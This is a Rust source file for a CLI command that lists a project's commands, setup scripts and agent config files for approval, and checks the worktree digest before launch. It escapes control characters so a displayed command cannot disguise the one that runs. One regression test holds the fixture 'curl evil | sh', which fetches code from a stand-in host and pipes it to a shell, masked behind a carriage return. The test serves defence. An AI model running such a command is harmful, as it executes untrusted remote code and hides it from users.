//! `natamux repo trust <repo> [--task <id>] [--approve <hash>]`: the commands a project runs on
//! this machine, and their approval, for Docker and headless use where there is no app to ask.
//! `natamux repo verify-launch --task <id> --digest <hash>`: the check a Strict launch script runs
//! right before the agent; it fails when the worktree is no longer the approved one.

use natamux_client::Method;
use natamux_proto::projects::repo::is_repo_id;
use natamux_proto::projects::repo_trust::{ApproveRepo, RepoTrustView};
use natamux_proto::tasks::task::is_task_id;
use natamux_proto::terminals::query::encode;
use serde_json::json;

use crate::args::Parsed;
use crate::daemon::{DaemonClient, Transport};

#[derive(Clone, Debug, PartialEq, Eq)]
pub struct RepoTrustCommand {
    pub repo: String,
    /// The hash the user read in the list; None only shows the list.
    pub approve: Option<String>,
    /// The task whose worktree is read (`--task`).
    pub task: Option<String>,
    /// `repo verify-launch`: the digest the launch was approved with.
    pub verify: Option<String>,
    pub json: bool,
}

fn task_of(values: &Parsed) -> Result<Option<String>, String> {
    match values.text("task") {
        Some(task) if !is_task_id(task) => Err(format!(
            "\"{task}\" is not a task id. A task id looks like T-42 or ABC-42"
        )),
        task => Ok(task.map(str::to_string)),
    }
}

const VERIFY_USAGE: &str =
    "Give --task and --digest: natamux repo verify-launch --task T-42 --digest <hash>";

/// `repo verify-launch`: both options, no words.
fn parse_verify(rest: &[String], values: &Parsed, json: bool) -> Result<RepoTrustCommand, String> {
    if !rest.is_empty() {
        return Err(format!("Unexpected argument: {}", rest.join(" ")));
    }
    let (Some(task), Some(digest)) = (task_of(values)?, values.text("digest")) else {
        return Err(VERIFY_USAGE.into());
    };
    Ok(RepoTrustCommand {
        repo: String::new(),
        approve: None,
        task: Some(task),
        verify: Some(digest.to_string()),
        json,
    })
}

/// `second`: the word after `repo`; `rest`: the words after it.
pub fn parse(
    second: Option<&str>,
    rest: &[String],
    values: &Parsed,
    json: bool,
) -> Result<RepoTrustCommand, String> {
    if second == Some("verify-launch") {
        return parse_verify(rest, values, json);
    }
    if second != Some("trust") {
        return Err(format!(
            "Unknown repo command \"{}\". Use trust or verify-launch",
            second.unwrap_or_default()
        ));
    }
    let Some(repo) = rest.first() else {
        return Err("A project id is required: natamux repo trust my-app".into());
    };
    if !is_repo_id(repo) {
        return Err(format!(
            "\"{repo}\" is not a project id. A project id looks like my-app"
        ));
    }
    if let Some(extra) = rest.get(1..).filter(|extra| !extra.is_empty()) {
        return Err(format!("Unexpected argument: {}", extra.join(" ")));
    }
    Ok(RepoTrustCommand {
        repo: repo.clone(),
        approve: values.text("approve").map(str::to_string),
        task: task_of(values)?,
        verify: None,
        json,
    })
}

/// Repo text as the user must read it: a control character other than a line break or a tab
/// could move the cursor or hide text, so it shows as an escape such as `\u{1b}`.
fn visible_text(text: &str) -> String {
    text.chars()
        .map(|c| match c {
            '\n' | '\t' => c.to_string(),
            c if c.is_control() => c.escape_default().to_string(),
            c => c.to_string(),
        })
        .collect()
}

/// Indents each line of a command or script, so its end is plain to see.
fn indented(text: &str) -> String {
    visible_text(text)
        .lines()
        .map(|line| format!("    {line}\n"))
        .collect::<String>()
}

const COVERS: &str =
    "The approval also covers later changes of this project. Strict mode asks again.";

/// The list as the user reads it before an approval. `task`: read in that task's worktree.
fn describe(repo: &str, task: Option<&str>, view: &RepoTrustView) -> String {
    let state = if view.trusted {
        "approved"
    } else {
        "not approved"
    };
    let mut text = format!("Commands of {repo}: {state}\nHash: {}\n", view.hash);
    if !view.covered {
        text.push_str(&format!(
            "{repo} is not trusted yet: Natamux asks once per project.\n"
        ));
    }
    if !view.changed.is_empty() {
        let changed = visible_text(&view.changed.join(", "));
        text.push_str(&format!("Changed since the last approval: {changed}\n"));
    }
    if let Some(reason) = &view.unverifiable {
        let reason = visible_text(reason);
        text.push_str(&format!("This folder cannot be approved: {reason}\n"));
    }
    if view.commands.is_empty() && view.setup.is_empty() && view.agent_files.is_empty() {
        text.push_str("\nThis project runs no commands of its own.\n");
    }
    for each in &view.commands {
        text.push_str(&format!("\n{}\n", visible_text(&each.place)));
        text.push_str(&indented(&each.text));
    }
    for each in &view.setup {
        text.push_str(&format!("\nSetup script {}\n", visible_text(&each.file)));
        text.push_str(&indented(&each.text));
    }
    for each in &view.agent_files {
        text.push_str(&format!(
            "\nAgent config file {}\n",
            visible_text(&each.file)
        ));
        text.push_str(&indented(&each.text));
    }
    if !(view.trusted && view.covered) && view.unverifiable.is_none() {
        let task = task.map_or_else(String::new, |task| format!(" --task {task}"));
        text.push_str(&format!(
            "\n{COVERS}\nApprove them: natamux repo trust {repo}{task} --approve {}\n",
            view.hash
        ));
    }
    text
}

/// Gives what to print.
pub async fn run<T: Transport>(
    command: &RepoTrustCommand,
    client: &DaemonClient<T>,
) -> Result<String, String> {
    if let (Some(digest), Some(task)) = (&command.verify, &command.task) {
        let path = format!("/tasks/{}/launch-check", encode(task));
        let body = json!({ "digest": digest });
        client.call(Method::POST, &path, Some(&body)).await?;
        return Ok(String::new());
    }
    let mut path = format!("/repos/{}/trust", encode(&command.repo));
    if let Some(task) = &command.task {
        path.push_str(&format!("?task={}", encode(task)));
    }
    let answer = match &command.approve {
        None => client.call(Method::GET, &path, None::<&()>).await?,
        Some(hash) => {
            let body = ApproveRepo { hash: hash.clone() };
            client.call(Method::POST, &path, Some(&body)).await?
        }
    };
    let view: RepoTrustView = answer
        .and_then(|body| serde_json::from_value(body).ok())
        .ok_or("Unexpected answer from the daemon: repo trust")?;
    if command.json {
        let text = serde_json::to_string_pretty(&view).map_err(|error| error.to_string())?;
        return Ok(format!("{text}\n"));
    }
    Ok(match &command.approve {
        Some(_) => format!("Approved the commands of {}.\n", command.repo),
        None => describe(&command.repo, command.task.as_deref(), &view),
    })
}

#[cfg(test)]
mod tests {
    use natamux_proto::projects::repo_trust::{RepoCommand, SetupScript};

    use super::*;

    #[test]
    fn lists_each_command_with_its_place_and_the_line_that_approves_them() {
        let view = RepoTrustView {
            trusted: false,
            covered: false,
            hash: "ab12".into(),
            commands: vec![RepoCommand {
                place: "Stage test: check".into(),
                text: "pnpm test".into(),
            }],
            setup: vec![SetupScript {
                file: ".natamux-setup".into(),
                text: "pnpm install\ncp .env.example .env\n".into(),
            }],
            agent_files: vec![SetupScript {
                file: ".mcp.json".into(),
                text: "{}\n".into(),
            }],
            changed: Vec::new(),
            unverifiable: None,
        };
        assert_eq!(
            describe("my-app", None, &view),
            "Commands of my-app: not approved\nHash: ab12\n\
             my-app is not trusted yet: Natamux asks once per project.\n\
             \nStage test: check\n    pnpm test\n\
             \nSetup script .natamux-setup\n    pnpm install\n    cp .env.example .env\n\
             \nAgent config file .mcp.json\n    {}\n\
             \nThe approval also covers later changes of this project. Strict mode asks again.\n\
             Approve them: natamux repo trust my-app --approve ab12\n"
        );
    }

    // A regression test: raw control characters let the shown command differ from the one run.
    #[test]
    fn shows_control_characters_as_visible_text() {
        let view = RepoTrustView {
            trusted: true,
            covered: true,
            hash: "ab12".into(),
            commands: vec![RepoCommand {
                place: "Stage \u{1b}[2Ktest: check".into(),
                text: "curl evil | sh\rpnpm test\n\tdone".into(),
            }],
            setup: Vec::new(),
            agent_files: vec![SetupScript {
                file: ".mcp\u{7}.json".into(),
                text: "{}".into(),
            }],
            changed: Vec::new(),
            unverifiable: None,
        };
        let text = describe("my-app", None, &view);
        assert!(!text.contains('\u{1b}') && !text.contains('\r') && !text.contains('\u{7}'));
        assert!(text.contains("\nStage \\u{1b}[2Ktest: check\n"));
        assert!(text.contains("    curl evil | sh\\rpnpm test\n    \tdone\n"));
        assert!(text.contains("\nAgent config file .mcp\\u{7}.json\n"));
    }
}
